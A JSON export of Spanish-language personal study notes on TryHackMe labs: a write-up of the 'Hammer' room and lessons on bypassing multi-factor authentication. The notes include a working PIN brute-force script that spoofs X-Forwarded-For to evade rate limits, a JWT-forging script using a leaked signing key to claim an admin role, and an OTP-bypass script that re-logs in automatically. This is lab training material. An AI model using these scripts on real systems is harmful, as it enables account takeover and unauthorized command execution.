[
  {
    "title": "2. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/2-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/2. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "1. Empezaremos con el reconocimiento (aunque ya sabemos por donde va a tirar, seguramente algo de MFA).\n\t1. Escaneo de puertos.\n\t   ![[Pasted image 20251226045221.png]]\n\t   Miramos a ver qué es el servicio waste.\n\t   ![[Pasted image 20251226045350.png]]\n\t2. Escaneo de puertos en profundidad.\n\t   ![[Pasted image 20251226045429.png]]\n\t   Como el puerto 80 no está abierto, no tiene sentido escanear directorios ni subdominios.\n2. Si vamos al puerto `1337` encontramos no que parece un endpoint de login.\n   ![[Pasted image 20251226045730.png]]\n3. Si miramos el código fuente podemos ver la convención de nombramiento de directorios.\n   ![[Pasted image 20251226045828.png]]\n   Si intentamos hacer fuzzeo de directorios a este tipo de dirección:\n   ![[Pasted image 20251226050658.png]]\n4. Si le damos al único archivo aparentemente interesante, `reset_password.php`, podemos ver el código de flujo del reseteo de contraseñas.\n   ![[Pasted image 20251226050007.png]]\n   Parece que hay una cuenta atrás en la que tienes que introducir el código.\n5. Si revisamos los directorios que encontramos fuzzeando antes, sólo hay dos que parecen poder tener algo interesante.\n\t1. El primero y más interesante es `/hmr_logs/`, el cual contiene logs de error de conexión en los que se detallan usuarios, endpoints, hostnames, etc.\n\t   ![[Pasted image 20251226051220.png]]\n\t2. El segundo, y algo menos llamativo es `/hmr_images`, en donde hay una imagen de un taller con martillo.\n\t   ![[Pasted image 20251226051304.png]]\n\t   No hay nada en la imagen, por lo que definitivamente seguiremos por el otro lado.\n\t   ![[Pasted image 20251226051450.png]]\n6. Vamos a investigar bien los logs que hemos encontrado.\n   ![[Pasted image 20251226052104.png]]\n\t1. Lo más llamativo a simple vista es que parece que tenemos un usuario: `tester@hammer.thm`.\n\t2. Además podemos ver la página a la que aparentemente querríamos poder acceder: `/restricted-area`.\n\t3. Vemos un posible hostname del sistema que nos puede servir más adelante para forzar la entrada por ssh: `hammerthm`.\n\t4. Vemos que hay un login de administrador: `/admin-login`.\n\t5. Parece que hay un límite de 10 peticiones, pero no sabemos en qué se basa para filtrar, todavía.\n7. Con todo esto en mente vamos a investigar las respuestas del servidor con BurpSuite.\n\t1. Para usuario y contraseñas erróneos:\n\t\t1. Manda usuario y contraseña por POST.\n\t\t   ![[Pasted image 20251226052659.png]]\n\t\t2. En la respuesta recibimos \"Invalid Email or Password\".\n\t\t   ![[Pasted image 20251226052821.png]]\n\t2. Para usuario correcto y contraseña errónea:\n\t\t1. La petición inicial sigue siendo igual pero con diferentes credenciales.\n\t\t   ![[Pasted image 20251226052934.png]]\n\t\t2. La respuesta también es igual.\n\t\t   ![[Pasted image 20251226053050.png]]\n8. Vamos a ver qué pasa si le damos a \"Forgot your password?\".\n\t1. Esta petición ya parece más interesante.\n\t   ![[Pasted image 20251226053711.png]]\n\t   Está llamando al endpoint `/reset_password.php`.\n\t2. Si dejamos pasar las peticiones y metemos el email, obtenemos una página con un contador.\n\t   ![[Pasted image 20251226053918.png]]\n\t3. Si introducimos un código que no es no nos saca directamente.\n\t   ![[Pasted image 20251226054009.png]]\n\t4. Si lo introducimos mal unas cuantas veces pone:\n\t   ![[Pasted image 20251226060052.png]]\n9. Ejecutaremos el siguiente código.\n   \n```python\nimport requests\nimport sys\nimport random\nfrom concurrent.futures import ThreadPoolExecutor\n\n# Configuración\nIP = \"IP\" #Cambia esto\nbase_url = f'http://{IP}:1337'\nurl = f'{base_url}/reset_password.php'\nemail = 'tester@hammer.thm'\nMAX_THREADS = 10\n\nexito = False\n\ndef get_new_session():\n    s = requests.Session()\n    try:\n        s.post(url, data={'email': email}, timeout=10)\n        if 'PHPSESSID' in s.cookies:\n            return s\n    except:\n        return None\n    return None\n\ndef batch_worker(start_pin):\n    global exito\n    if exito: return\n\n    session = get_new_session()\n    if not session: return\n\n    for i in range(7):\n        current_pin = start_pin + i\n        if current_pin > 9999 or exito: break\n        \n        pin_str = f\"{current_pin:04d}\"\n        headers = {\n            'X-Forwarded-For': f\"127.0.0.{random.randint(1,254)}\",\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n        data = {'recovery_code': pin_str, 's': '180'}\n\n        try:\n            # Importante: allow_redirects=True para seguir a la página de nueva password\n            resp = session.post(url, data=data, headers=headers, allow_redirects=True, timeout=10)\n\n            if \"Invalid or expired\" not in resp.text and \"Rate limit\" not in resp.text:\n                exito = True\n                print(f\"\\n\\n[!] ¡ÉXITO! PIN CONFIRMADO: {pin_str}\")\n                print(f\"[+] PHPSESSID: {session.cookies.get('PHPSESSID')}\")\n                print(f\"[+] URL FINAL: {resp.url}\")\n                \n                # Guardamos la página para que la veas\n                with open(\"exito.html\", \"w\") as f:\n                    f.write(resp.text)\n                print(f\"[+] Contenido guardado en 'exito.html'. Ábrelo con tu navegador.\")\n                return\n\n            sys.stdout.write(f\"\\r[*] Intentando: {pin_str} \")\n            sys.stdout.flush()\n        except:\n            pass\n\ndef main():\n    pines_iniciales = [i for i in range(0, 10000, 7)]\n    # Como ya sabemos que es el 1013, el script llegará rápido.\n    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:\n        executor.map(batch_worker, pines_iniciales)\n\nif __name__ == \"__main__\":\n    main()\n   ```\n   \n   Obtenemos lo siguiente:\n   ![[Pasted image 20251226063426.png]]\n\n10. Si metemos dicha cookie y OTP:\n    ![[Pasted image 20251226063621.png]]\n11. Si cambiamos la contraseña e iniciamos sesión:\n    ![[Pasted image 20251226063708.png]]\n    Hemos encontrado la flag del dashboard, nos queda la del sistema.\n12. Si probamos con ls vemos que hay un archivo `.php` de ejecución de comandos.\n    ![[Pasted image 20251227214535.png]]\n13. Parece ser que hay un elemento que nos echa de la sesión. Si miramos el código fuente:\n    ![[Pasted image 20251227215423.png]]\n    Podemos ver que si el valor `persistentCookie` no está en true nos echará todo el rato.\n14. Vamos a interceptar una petición de ejecución de comandos con Burp Suite.\n    ![[Pasted image 20251227220212.png]]\n    Vemos que hay un archivo `.key`.\n15. Vamos a analizar el JWT con `jwt.io`.\n    ![[Pasted image 20251227220459.png]]\n16. Como tenemos acceso podemos listar el secreto `188ade1.key`.\n    ![[Pasted image 20251227220723.png]]\n17. Vamos a usar un script de python para generar el JWT.\n    \n```python\nimport jwt\n\n# The secret key from /var/www/mykey.key\nsecret_key = \"56058354efb3daa97ebab00fabd7a7d7\"\n\n# JWT header including 'kid'\nheader = {\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\",\n    \"kid\": \"/var/www/html/188ade1.key\"\n}\n\n# Payload with the 'admin' role\npayload = {\n    \"iss\": \"http://hammer.thm\",\n    \"aud\": \"http://hammer.thm\",\n    \"iat\": TiempoDeCreación,\n    \"exp\": TiempoDeExpiración (poner más alto),\n    \"data\": {\n        \"user_id\": 1,\n        \"email\": \"tester@hammer.thm\",\n        \"role\": \"admin\"\n    }\n}\n\n# Encode the JWT with the specific header\ntoken = jwt.encode(payload, secret_key, algorithm=\"HS256\", headers=header)\n\n# Print the generated token\nprint(token)\n```\n\n18. Lo ejecutamos y obtenemos el JWT.\n    ![[Pasted image 20251227221145.png]]\n19. Metemos dicho token en el header authorization bearer y en el valor y ejecutamos un comando para leer `/home/ubuntu/flag.txt`.\n    \n    ![[Pasted image 20251227222238.png]]\n\n>[!CAUTION] Lee los scripts usados antes de utilizarlos para entender cómo funcionan y qué cosas debes cambiar.\n\n>[!SUCCESS] Hemos conseguido obtener ambar flags. También podríamos haber obtenido una reverse shell del sistema en nuestra máquina pero no era necesario para el propósito de la máquina.",
    "modified": "2025-12-28T01:00:21"
  },
  {
    "title": "0. Hammer",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/0-hammer/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/1. Introduction]]\n[[2. Getting the Flags]]",
    "modified": "2025-12-27T00:52:04"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "![[Pasted image 20251226042759.png]]\nCon el Martillo en mano, ¿puedes bypassear los mecanismos de autentificación y conseguir RCE en el sistema?",
    "modified": "2025-12-27T00:52:04"
  },
  {
    "title": "6. Practical Beating the Auto-Logout Feature",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/6-practical-beating-the-auto-logout-feature/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/6. Practical Beating the Auto-Logout Feature.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "En algunas aplicaciones, fallar el reto 2FA puede causar que la aplicación revierta al usuario de vuelta a la primera parte de autentificación del proceso. Este comportamiento ocurre normalmente debido a medidas de seguridad para prevenir la fuerza bruta.\n\n-------------------------------------\n<h2>Razones Comunes para este Comportamiento</h2>\n<h4>Invalidación de Sesión</h4>\nSi fallas la autentificación 2FA, la aplicación puede que invalide la sesión del usuario como medida de seguridad, forzando al usuario a que comience de nuevo el proceso de autentificación.\n<h4>Limitación de Frecuencia y Políticas de Bloqueo</h4>\nPara prevenir que los atacantes intenten bypassear el 2FA repetidamente, la aplicación puede tener un límite de frecuencia o mecanismos de bloqueo que se disparan después de un número de intentos fallidos.\n<h4>Redirección por Seguridad</h4>\nAlgunas aplicaciones están diseñadas para redirigir a los usuarios de vuelta a la página de login después de un número de intentos fallidos, revirtiendo al usuario al paso inicial.\n\n-------------------------------------\n<h2>La Automatización es Clave</h2>\nLa automatización hace la vida más fácil al atacar estos tipos de protección porque:\n\n<h4>Rapidez</h4>\nIniciar sesión manualmente cada vez que te cierran la sesión es lento y tedioso. La automatización lo puede hacer mucho más rápido.\n<h4>Consistencia</h4>\nLa automatización evita errores que pueden pasar si estás haciendo acciones repetitivas una y otra vez. Es confiable.\n<h4>Recuperarse de los Cierres de Sesión</h4>\nSi la aplicación te cierra la sesión después de unos cuantos intentos fallidos, el script puede iniciar sesión de vuelta y seguir intentándolo. Esto ahorra el proceso de tener que hacerlo manualmente cada vez.\n<h4>Personalización</h4>\nCrear un script de automatización manualmente para el ataque ofrece más flexibilidad que usar una única herramienta como ZAP o Burp Suite. Puedes personalizar tus scripts para comprobar escenarios específicos como usar diferentes IPs o user-agents o variar  los tiempos entre peticiones.\n\n--------------------------------\n<h2>Explotación</h2>\nLa aplicación hosteada en http://mfs.thm/labs/third cierra la sesión del usuario automáticamente si falla el 2FA. Con propósito de demostración, la aplicación también genera un PIN de 4 dígitos cada vez que el usuario inicia sesión en la aplicación.\n\n>[!NOTE] En una aplicación real el PIN suele fluctuar entre 0000 y 9999 (si tiene 4 dígitos), pero por el propósito de la tarea está reducido.\n\n```php\nfunction generateToken()\n{\n    $token = strval(rand(1250, 1350));\n\n    $_SESSION['token'] = $token;\n    return 'success';\n}\n```\n\nUsando el siguiente script, guárdalo como **exploit.py** y ejecútalo en tu terminal:\n\n```python\nimport requests\n\n# Define the URLs for the login, 2FA process, and dashboard\nlogin_url = 'http://mfa.thm/labs/third/'\notp_url = 'http://mfa.thm/labs/third/mfa'\ndashboard_url = 'http://mfa.thm/labs/third/dashboard'\n\n# Define login credentials\ncredentials = {\n    'email': 'thm@mail.thm',\n    'password': 'test123'\n}\n\n# Define the headers to mimic a real browser\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',\n    'Accept-Language': 'en-US,en;q=0.5',\n    'Accept-Encoding': 'gzip, deflate',\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Origin': 'http://mfa.thm',\n    'Connection': 'close',\n    'Referer': 'http://mfa.thm/labs/third/mfa',\n    'Upgrade-Insecure-Requests': '1'\n}\n\n# Function to check if the response contains the login page\ndef is_login_successful(response):\n    return \"User Verification\" in response.text and response.status_code == 200\n\n# Function to handle the login process\ndef login(session):\n    response = session.post(login_url, data=credentials, headers=headers)\n    return response\n  \n# Function to handle the 2FA process\ndef submit_otp(session, otp):\n    # Split the OTP into individual digits\n    otp_data = {\n        'code-1': otp[0],\n        'code-2': otp[1],\n        'code-3': otp[2],\n        'code-4': otp[3]\n    }\n    \n    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects\n    print(f\"DEBUG: OTP submission response status code: {response.status_code}\")\n    \n    return response\n\n# Function to check if the response contains the login page\ndef is_login_page(response):\n    return \"Sign in to your account\" in response.text or \"Login\" in response.text\n\n# Function to attempt login and submit the hardcoded OTP until success\ndef try_until_success():\n    otp_str = '1337'  # Hardcoded OTP\n\n    while True:  # Keep trying until success\n        session = requests.Session()  # Create a new session object for each attempt\n        login_response = login(session)  # Log in before each OTP attempt\n        \n        if is_login_successful(login_response):\n            print(\"Logged in successfully.\")\n        else:\n            print(\"Failed to log in.\")\n            continue\n\n        print(f\"Trying OTP: {otp_str}\")\n\n        response = submit_otp(session, otp_str)\n\n        # Check if the response is the login page (unsuccessful OTP)\n        if is_login_page(response):\n            print(f\"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}\")\n            continue  # Retry login and OTP submission\n\n        # Check if the response is a redirect (status code 302)\n        if response.status_code == 302:\n            location_header = response.headers.get('Location', '')\n            print(f\"Session cookies: {session.cookies.get_dict()}\")\n\n            # Check if it successfully bypassed 2FA and landed on the dashboard\n            if location_header == '/labs/third/dashboard':\n                print(f\"Successfully bypassed 2FA with OTP: {otp_str}\")\n                return session.cookies.get_dict()  # Return session cookies after successful bypass\n            elif location_header == '/labs/third/':\n                print(f\"Failed OTP attempt. Redirected to login. OTP: {otp_str}\")\n            else:\n                print(f\"Unexpected redirect location: {location_header}. OTP: {otp_str}\")\n        else:\n            print(f\"Received status code {response.status_code}. Retrying...\")\n\n# Start the attack to try until success\ntry_until_success()\n```\n\n<h4>Desglose del código</h4>\n<h6>Preparación del Script</h6>\n- **URLs:**\n\t- `login_url`: La URL de la página de inicio de sesión.\n\t- `otp_url`: La URL de la página donde se sube el PIN de 4 dígitos.\n\t- `dashboard_url`: La URL de la página a la que se redirige al usuario después de un inicio de sesión exitoso.\n- **Credenciales:**\n\t- El diccionario `credentials` contiene los emails y contraseñas que serán usadas para iniciar sesión.\n- **Headers:** \n\t- El diccionario `headers` contiene los headers HTTP que imitan a una petición de navegador real, incluyendo `User-Agent`, `Referer`, `Content-Type` y más.\n<h6>Funciones</h6>\n- `is_login_successful(response)`: Comprueba si el login fue exitoso buscando la frase \"User Verification\" en la respuesta y asegurando que el código de estado es `200 OK`.\n- `login(session)`: Realiza el login mandando una petición POST con las credenciales del usuario a la `login_url`. Devuelve la respuesta del servidor.\n- `submit_otp(session,otp)`: Manda el PIN OTP de 4 dígitos a `otp_url` como petición POST. El OTP se divide en dígitos individuales y se mandan como parámetros (`code-1`, `code-2`, etc.). Devuelve la respuesta del servidor.\n- `is_login_page(response)`: Comprueba si la respuesta contiene la página de login buscando palabras clave como \"Sign in to your account\" o \"Login\" en la respuesta.\n<h6>Proceso de Fuerza Bruta</h6>\n- **Rango OTP:** El script ciclará hasta que la aplicación responda con el mismo OTP configurado en el script.\n- **Creación de Sesión:** Para cada intento OTP, una nueva sesión es creada usando `requests.Session()`, asegurando una sesión nueva para cada login e intento de subida OTP.\n- **Intento de Login:** El script intenta iniciar sesión usando las credenciales ofrecidas. Si el login es exitoso, imprime \"Logged in successfully\" y continúa con la subida OTP. Si el login falla, el script salta hasta el próximo OTP.\n- **Subida OTP:** El formato del script OTP tiene una string de 4 dígitos y la manda a `otp_url`.\n- **Manejo de Respuesta:**\n\t- Si la respuesta del servidor contiene la página de login, el script imprime un mensaje de error y continúa con el siguiente OTP.\n\t- Si la respuesta tiene un código de estado `302 Found`, comprueba el header `Location`:\n\t\t- Si es redirigido a `/labs/third/dashboard`, indica un bypass exitoso de OTP y el script imprime un mensaje de éxito y sale.\n\t\t- Si es redirigido a `/labs/third`, indica OTP fallado y muestra un mensaje de error.\n\t\t- Cualquier otra dirección de redirección se marca como inesperada\n\t- Si la respuesta tiene cualquier otro código de estado, el script lo imprime y prueba el siguiente OTP.\n\nUna vez que el script tiene éxito con la fuerza bruta, inicia sesión.\n\n![[Pasted image 20251226042333.png]]\n\nUsando la PHPSESSID que hemos obtenido, vamos a http://mfa.thm/labs/third, abrimos las herramientas de desarrollador y cambiamos el valor PHPSESSID en el apartado de \"Cookies\" en \"Storage\".\n\n![[Pasted image 20251226042459.png]]\n\nUna vez cambiado vamos a http://mfa.thm/labs/third/dashboard.\n\n![[Pasted image 20251226042607.png]]",
    "modified": "2025-12-27T00:52:04"
  },
  {
    "title": "4. Practical - OTP Leakage",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/4-practical-otp-leakage/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/4. Practical - OTP Leakage.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "<h2>Filtración OTP</h2>\nLa filtración OTP en la respuesta XHR (XMLHttpRequest), típicamente ocurre debido a la implementación pobre de 2FA o programación insegura. Algunas razones comunes por lo que esto ocurre son:\n\n<h4>Validación del Lado del Servidor y Devolución de Información Sensible</h4>\nEn algunas aplicaciones diseñadas pobremente, el servidor valida el OTP y más que sólo confirmar el éxito o fracaso, devuelve el OTP en la respuesta. Esto es comúnmente hecho no intencionalmente, como parte del debugging, registro o prácticas pobres de manejo de respuestas.\n<h4>Falta de Prácticas de Seguridad Adecuadas</h4>\nLos desarrolladores pueden pasar por alto las implicaciones de seguridad de exponer información sensible como los OTP en las respuestas API. Esto suele pasar cuando los desarrolladores están concentrados en hacer la aplicación funcional sin considerar cómo los atacantes podrían explotar estas respuestas.\n<h4>Información de Depuración Dejada en Producción</h4>\nDurante el desarrollo o la fase de pruebas, los desarrolladores pueden incluir depuración detallada en las respuestas para ayudar a diagnosticar errores. Si estas no se eliminan en producción, pueden revelar información sensible para los atacantes.\n\n------------------------------------------------------\n<h2>Explotación</h2>\nVamos a http://mfa.thm/labs/first.\n\n![[Pasted image 20251225204437.png]]\n\nVamos a las herramientas del desarrollador y a \"Network\" e iniciamos sesión en la aplicación usando:\n\n- **Username:** `thm@mail.thm`\n- **Password:** `test123`\n\n![[Pasted image 20251225205724.png]]\n\nUna vez introducidas las credenciales, podemos observar que hay una respuesta llamada token de 16B.\n\n![[Pasted image 20251225205920.png]]\n\nSi navegamos hasta el apartado de \"Response\" dentro de la petición XHR, podemos ver el valor del token.\n\n![[Pasted image 20251225210013.png]]\n\nCogemos el token y lo introducimos como OTP.\n\n![[Pasted image 20251225210107.png]]\n\nY efectivamente así entramos.\n\n![[Pasted image 20251225210127.png]]",
    "modified": "2025-12-26T00:53:51"
  }
]